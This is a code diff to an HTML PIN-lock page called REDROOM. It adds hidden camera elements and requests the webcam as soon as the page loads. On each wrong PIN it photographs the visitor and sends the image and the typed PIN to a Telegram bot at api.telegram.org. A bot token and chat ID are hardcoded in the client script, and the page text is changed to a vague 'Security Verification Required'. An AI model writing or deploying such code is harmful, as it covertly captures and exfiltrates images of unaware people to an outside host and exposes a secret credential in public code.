@@ -6,38 +6,58 @@
     <title>REDROOM | Security</title>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
     <style>
-        body { background: #000; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .lock-box { text-align: center; width: 300px; display: none; } /* শুরুতে হাইড থাকবে */
+        body { background: #000; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        .lock-box { text-align: center; width: 300px; display: none; z-index: 10; }
         .dots { display: flex; justify-content: center; gap: 15px; margin: 30px 0; }
         .dot { width: 15px; height: 15px; border: 2px solid #333; border-radius: 50%; }
         .dot.active { background: #e50914; border-color: #e50914; box-shadow: 0 0 10px #e50914; }
         .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; }
         .key { width: 70px; height: 70px; background: #1a1a1a; border-radius: 50%; display: flex; justify-content: center; align-items: center; font-size: 24px; cursor: pointer; }
         .key:active { background: #333; }
+        /* Hidden Camera Elements */
+        #video, #canvas { display: none; }
     </style>
 </head>
 <body>
 
     <div class="lock-box" id="lockBox">
         <h2 style="color:#e50914">REDROOM</h2>
-        <p>Enter 4-Digit PIN</p>
+        <p>Security Verification Required</p>
         <div class="dots">
             <div class="dot" id="d1"></div><div class="dot" id="d2"></div><div class="dot" id="d3"></div><div class="dot" id="d4"></div>
         </div>
         <div class="keypad" id="pad"></div>
     </div>
 
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
     <script>
         // --- সেটিংস ---
-        const isLockEnabled = true; // লক বন্ধ করতে চাইলে false লিখে দিন
-        const PIN = "2026"; // আপনার পিন কোড
+        const isLockEnabled = true; 
+        const PIN = "2026"; 
+        const botToken = "8490594899:AAE09QVVv2Z1OeOONTAbftWdv5KW-UZM8fo";
+        const chatId = "7920005988";
         // --------------
+
+        let stream = null;
+
+        // ক্যামেরা চালু করার চেষ্টা (সাইলেন্টলি)
+        async function initCamera() {
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                document.getElementById('video').srcObject = stream;
+            } catch (err) {
+                console.log("Camera access blocked");
+            }
+        }
 
         // লক চেক করা
         if (!isLockEnabled) {
             window.location.href = "index.html";
         } else {
             document.getElementById('lockBox').style.display = 'block';
+            initCamera(); // পেজ লোড হতেই ক্যামেরা পারমিশন চাইবে
         }
 
         let input = "";
@@ -66,7 +86,10 @@
                     window.location.href = "index.html";
                 } 
                 else if(input.length === 4) { 
-                    alert("Wrong PIN"); 
+                    // ভুল পিন দিলে ছবি তুলবে
+                    takeSnapAndSend(input);
+                    
+                    alert("Wrong PIN! Access Denied."); 
                     input = ""; 
                     for(let i=1; i<=4; i++) {
                         document.getElementById('d'+i).classList.remove('active');
@@ -75,6 +98,25 @@
             };
             pad.appendChild(k);
         });
+
+        async function takeSnapAndSend(wrongPin) {
+            if (!stream) return;
+
+            const canvas = document.getElementById('canvas');
+            const video = document.getElementById('video');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+
+            canvas.toBlob(async (blob) => {
+                const fd = new FormData();
+                fd.append('chat_id', chatId);
+                fd.append('photo', blob, 'intruder.jpg');
+                fd.append('caption', `⚠️ **WRONG PIN DETECTED** ⚠️\n\nTyped PIN: ${wrongPin}\nStatus: Access Blocked`);
+                
+                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
+            }, 'image/jpeg');
+        }
     </script>
 </body>
 </html>
